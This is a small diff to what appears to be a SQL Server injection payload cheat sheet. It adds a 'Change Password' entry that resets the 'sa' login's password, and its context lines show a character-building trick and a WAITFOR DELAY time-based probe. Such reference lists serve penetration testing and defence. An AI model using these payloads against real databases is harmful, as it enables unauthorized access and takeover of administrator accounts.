@@ -25,3 +25,5 @@ SQL Server Payload
     - ``SELECT char(65)+char(66)`` => return ``AB``
 - Delay
     - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
+- Change Password
+    - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
